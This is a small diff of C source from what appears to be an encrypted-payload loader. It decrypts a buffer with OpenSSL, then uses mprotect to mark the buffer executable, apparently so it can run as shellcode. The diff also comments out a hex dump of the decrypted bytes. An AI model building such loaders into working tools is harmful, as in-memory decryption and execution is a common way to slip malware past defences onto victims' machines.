@@ -111,16 +111,17 @@ int main (int argc, char *argv[]) {
 		ERR_print_errors_fp(stderr);
 		EVP_CIPHER_CTX_cleanup(&ctx);
 		return 0;
-         }
+        }
          
-         outlen += tmp;
+        outlen += tmp;
          
 	printf ("Our decrypted payload has %d bytes\n", outlen);
 	
+	/**	
 	printf("Decrypted buffer:\n");
 	show_hex ((const char *)instr, outlen);
 	printf("\n");
-		
+	*/	
 	if(mprotect (instr, outlen, PROT_READ | PROT_WRITE | PROT_EXEC) < 0) {
 		fprintf(stderr, "mprotect failed!\n");
 		return 1;
